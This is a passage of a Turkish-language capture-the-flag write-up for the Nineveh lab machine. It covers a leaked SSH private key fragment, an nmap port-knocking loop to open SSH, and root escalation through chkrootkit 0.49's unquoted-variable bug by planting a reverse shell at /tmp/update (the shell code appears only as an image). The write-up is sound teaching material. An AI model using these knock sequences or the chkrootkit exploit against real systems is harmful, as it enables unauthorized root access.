fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
```

Public key bir kullanıcı adı verir, amrois:

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
```


### Examine Port Knocking

Shell'den www-data olarak çıkan diğer ilginç şey ise knockd prosesidir:

```
www-data@nineveh:/$ ps auxww
...[snip]...
root      1334  1.1  0.2   8756  2228 ?        Ss   Apr10  15:29 /usr/sbin/knockd -d -i ens33
...[snip]...
```

**knockd**, port knocking için bir daemon'dur ve belirli portlara sırasıyla erişildiğinde bazı güvenlik duvarı kurallarını ayarlar. Yapılandırma dosyasını **/etc/knockd.conf** yolunda bulabilirim.

```
www-data@nineveh:/$ cat /etc/knockd.conf 
[options]
 logfile = /var/log/knockd.log
 interface = ens33

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
```


Bu, 571, 290 ve ardından 911 numaralı portlara sırasıyla SYN paketleri göndererek, hepsini 5 saniye içinde yaparak SSH'yi açabileceğimi söylüyor. Bunu yaptığımda, IP adresimi port 22'ye erişim için izin veren bir kural ekleyecek.


### Knock

Bu wiki sayfası port knock için nmap kullanımına iyi bir örnek vermektedir. Bunu bir satır olarak yazacağım:

```
root@kali# for i in 571 290 911; do
> nmap -Pn --host-timeout 100 --max-retries 0 -p $i 10.10.10.43 >/dev/null
> done; ssh -i ~/keys/id_rsa_nineveh_amrois amrois@10.10.10.43
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

133 packages can be updated.
66 updates are security updates.
                                                                                                                                                                                                        
                                                                                                                                                                                                        
You have mail.                                                                                                                                                                                          
Last login: Wed Apr 22 05:34:21 2020 from 10.10.14.24                                                                                                                                                    
amrois@nineveh:~$
```

Üç portu döngüyle tarar ve her biri için, kısa bir zaman aşımı ve yeniden deneme yapmadan Nineveh’i nmap ile tarar, çıktıyı /dev/null'a yönlendirir. Ardından SSH ile bağlanır.

Ayrıca user.txt dosyasını da alabilirim:

![Pasted image 20250208004625.png](/img/user/resimler/Pasted%20image%2020250208004625.png)

![Pasted image 20250208004639.png](/img/user/resimler/Pasted%20image%2020250208004639.png)

### Shortcut - SSH from localhost

İlk çözdüğümde knockd'yi aramadım, bunun yerine Ninova'da /dev/shm'de private key'in bir kopyasını oluşturdum.

```
www-data@nineveh:/dev/shm$ chmod 600 .id_rsa
www-data@nineveh:/dev/shm$ ssh -i .id_rsa amrois@10.10.10.43
Could not create directory '/var/www/.ssh'. 
The authenticity of host '10.10.10.43 (10.10.10.43)' can't be established.
ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

133 packages can be updated.
66 updates are security updates.


You have mail.
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$
```


## Priv: amrois –> root

### Enumeration

Linpeas ile pek bir şey bulamadıktan sonra, sistem root'unda /report adında alışılmadık bir klasör fark ettim. İçinde güncel tarihli metin dosyaları vardı:

```
amrois@nineveh:/report$ ls -la
total 32
drwxr-xr-x  2 amrois amrois 4096 Apr 11 14:12 .
drwxr-xr-x 24 root   root   4096 Jul  2  2017 ..
-rw-r--r--  1 amrois amrois 4799 Apr 11 14:10 report-20-04-11:14:10.txt
-rw-r--r--  1 amrois amrois 4799 Apr 11 14:11 report-20-04-11:14:11.txt
-rw-r--r--  1 root   root   4384 Apr 11 14:12 report-20-04-11:14:12.txt
amrois@nineveh:/report$ date
Sat Apr 11 14:12:09 CDT 2020
```

Raporlar, ortak yürütülebilir dosyalarda ve tekil dosyalarda yapılan değişiklikleri arar:

```
amrois@nineveh:/report$ cat report-20-04-11:14:12.txt                                 
ROOTDIR is `/'                                                                        
Checking `amd'... not found                                                           
Checking `basename'... not infected                                                   
Checking `biff'... not found                                                          
Checking `chfn'... not infected                                                       
Checking `chsh'... not infected                                                       
Checking `cron'... not infected                                                       
Checking `crontab'... not infected
...[snip]...
Checking `aliens'... 
/dev/shm/pspy64
Searching for sniffer's logs, it may take a while... nothing found
Searching for HiDrootkit's default dir... nothing found
Searching for t0rn's default files and dirs... nothing found
Searching for t0rn's v8 defaults... nothing found
Searching for Lion Worm default files and dirs... nothing found
Searching for RSHA's default files and dir... nothing found
Searching for RH-Sharpe's default files... nothing found
Searching for Ambient's rootkit (ark) default files and dirs... nothing found
Searching for suspicious files and dirs, it may take a while... 
/lib/modules/4.4.0-62-generic/vdso/.build-id
/lib/modules/4.4.0-62-generic/vdso/.build-id
Searching for LPD Worm files and dirs... nothing found
Searching for Ramen Worm files and dirs... nothing found
Searching for Maniac files and dirs... nothing found
...[snip]...
Searching for suspect PHP files... 
/var/tmp/0xdf.php

Searching for anomalies in shell history files... Warning: `//root/.bash_history' file size is zero
Checking `asp'... not infected
...[snip]...
```

İlginç bir şekilde, webshell'imi tanımladı.

Pspy'yi yükledim ve çalıştırdım ve her dakika, /usr/bin/chkrootkit'e atıfta bulunan proseslerin birçoğu ile bir aktivite dalgası var. chkrootkit, bir hostu rootkit belirtileri için kontrol eden bir araçtır.


### chkroot Exploit

Neyse ki benim için chkrootkit'e karşı bir açık var:

```
root@kali# searchsploit chkrootkit
---------------------------------------------------- ----------------------------------------
 Exploit Title                                      |  Path
                                                    | (/usr/share/exploitdb/)
---------------------------------------------------- ----------------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit | exploits/linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation        | exploits/linux/local/33899.txt
---------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```


Txt dosyası, $SLAPPER_FILES içindeki herhangi bir dosyanın bu döngü nedeniyle bir yazım hatası nedeniyle çalışacağını söylüyor:

```
   for i in ${SLAPPER_FILES}; do
      if [ -f ${i} ]; then
         file_port=$file_port $i
         STATUS=1
      fi
```

Bu durumda, `$file_port` değişkenine `"$file_port $i"` değerini atamak istiyorsunuz, ancak tırnak işaretleri (`""`) eksik olduğu için Bash, bu komutu yanlış yorumluyor. Tırnak işaretleri olmadan Bash, `file_port=$file_port` şeklinde bir atama yapar ve ardından `$i`'yi bir komut olarak çalıştırmaya çalışır. Bu da beklenmeyen davranışlara neden olabilir.

```
SLAPPER_FILES="${ROOTDIR}tmp/.bugtraq ${ROOTDIR}tmp/.bugtraq.c" SLAPPER_FILES="$SLAPPER_FILES ${ROOTDIR}tmp/.unlock ${ROOTDIR}tmp/httpd \ ${ROOTDIR}tmp/update ${ROOTDIR}tmp/.cinik ${ROOTDIR}tmp/.b"a
```


### Shell

Ben /tmp/update dosyasına basit bir reverse shell yazacağım ve onu çalıştırılabilir yapacağım:

![Pasted image 20250208005335.png](/img/user/resimler/Pasted%20image%2020250208005335.png)

Bir sonraki chkroot çalışmasında bir shell alıyorum:

![Pasted image 20250208005452.png](/img/user/resimler/Pasted%20image%2020250208005452.png)
